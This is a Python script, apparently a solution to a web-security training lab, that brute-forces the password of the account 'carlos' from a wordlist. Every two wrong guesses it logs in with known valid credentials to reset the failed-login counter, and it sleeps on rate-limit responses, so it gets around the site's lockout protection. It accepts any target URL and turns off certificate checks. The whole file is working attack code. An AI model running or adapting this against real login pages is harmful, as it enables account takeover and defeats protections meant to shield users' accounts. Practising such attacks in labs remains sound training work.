import requests
import sys
import re
import time
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

PASSWORD_TEXT_FILE = "passwords.txt"

CORRECT_USERNAME = "wiener"
CORRECT_PASSWORD = "peter"
TARGET_USERNAME = "carlos"

# after this many WRONG attempts in a row, throw in one correct login to reset the counter
WRONG_ATTEMPTS_BEFORE_RESET = 2


def normalize_url(url: str) -> str:
    if not url.startswith(("http://", "https://")):
        url = "https://" + url
    return url.rstrip("/")


# def get_csrf_token(s, login_url):
#     r = s.get(login_url, verify=False)
#     match = re.search(r'name="csrf" value="([^"]+)"', r.text)
#     if not match:
#         raise RuntimeError(f"Could not find CSRF token on {login_url} (status {r.status_code})")
#     return match.group(1)


def attempt_login(s, login_url, username, password):
    # csrf = get_csrf_token(s, login_url)
    r = s.post(
        login_url,
        data={"username": username, "password": password},
        verify=False,
        allow_redirects=False,  # 302 on success, 200 (form reload) on failure
    )
    return r


def is_success(r):
    return r.status_code == 302


def brute_force_account(s, base_url):
    login_url = f"{base_url}/login"

    with open(PASSWORD_TEXT_FILE) as f:
        passwords = [line.strip() for line in f if line.strip()]

    wrong_streak = 0

    for password in passwords:
        # reset the failed-attempt counter before it hits the lockout threshold
        if wrong_streak >= WRONG_ATTEMPTS_BEFORE_RESET:
            r = attempt_login(s, login_url, CORRECT_USERNAME, CORRECT_PASSWORD)
            print(f"[-] Reset login ({CORRECT_USERNAME}:{CORRECT_PASSWORD}) -> status {r.status_code}")
            if not is_success(r):
                print("[!] Reset login failed - lockout may have already triggered. Slowing down.")
                time.sleep(30)
            wrong_streak = 0

        r = attempt_login(s, login_url, TARGET_USERNAME, password)
        print(f"[-] Trying {TARGET_USERNAME}:{password} -> status {r.status_code}")

        if is_success(r):
            print(f"\n[+] SUCCESS! Valid password for '{TARGET_USERNAME}': {password}")
            return password

        if r.status_code == 429 or "you have made too many" in r.text.lower():
            print("[!] Locked out. Backing off for 60s...")
            time.sleep(60)
            wrong_streak = 0
            continue

        wrong_streak += 1

    print("[-] Password not found in list.")
    return None


def main():
    if len(sys.argv) < 2:
        print(f"Usage: python3 {sys.argv[0]} <target_url>")
        sys.exit(1)

    target_url = normalize_url(sys.argv[1])

    with requests.Session() as s:
        brute_force_account(s, target_url)


if __name__ == "__main__":
    main()